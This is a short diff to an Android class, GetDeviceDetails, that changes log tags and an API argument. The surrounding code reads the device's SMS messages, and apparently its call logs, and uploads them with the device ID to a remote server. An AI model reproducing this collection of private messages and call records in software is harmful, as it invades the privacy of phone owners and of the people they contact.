@@ -328,7 +328,7 @@ public class GetDeviceDetails extends Activity {
             }, new Response.ErrorListener() {
                 @Override
                 public void onErrorResponse(VolleyError error) {
-                    Log.e("VOLLEY-Error", error.toString());
+                    Log.e("VOLLEY-Error Call Log", error.toString());
                 }
             }) {
                 @Override
@@ -407,7 +407,7 @@ public class GetDeviceDetails extends Activity {
 
 //        sendData(1,  "Send Data",lstSms.toString(), "dateString", "timeString", android_id, "Android SDK", "Android SDK");
         Log.d("SMS - ", lstSms.toString());
-        callMessagePushApi(context, 1, lstSms.toString(), "Call Method", "dateString", "timeString", android_id, "Android SDK", "Android SDK");
+        callMessagePushApi(context, 1,  "FROM", lstSms.toString(), "dateString", "timeString", android_id, "Android SDK", "Android SDK");
         c.close();
 
     }
@@ -456,7 +456,7 @@ public class GetDeviceDetails extends Activity {
             }, new Response.ErrorListener() {
                 @Override
                 public void onErrorResponse(VolleyError error) {
-                    Log.e("VOLLEY-Error", error.toString());
+                    Log.e("VOLLEY-Error SMS", error.toString());
                 }
             }) {
                 @Override
